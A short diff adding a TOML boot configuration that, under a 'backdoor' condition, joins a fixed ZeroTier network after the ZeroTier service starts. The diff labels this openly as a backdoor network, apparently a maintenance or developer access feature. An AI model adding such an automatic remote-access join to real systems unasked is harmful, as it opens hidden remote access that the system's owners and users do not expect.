@@ -1,0 +1,8 @@
+# Join the backdoor network on boot
+[startup.backdoor]
+name = "zerotier.join"
+condition = "backdoor"
+after = ["zerotier"]
+
+[startup.backdoor.args]
+network = "1d71939404587f3c"
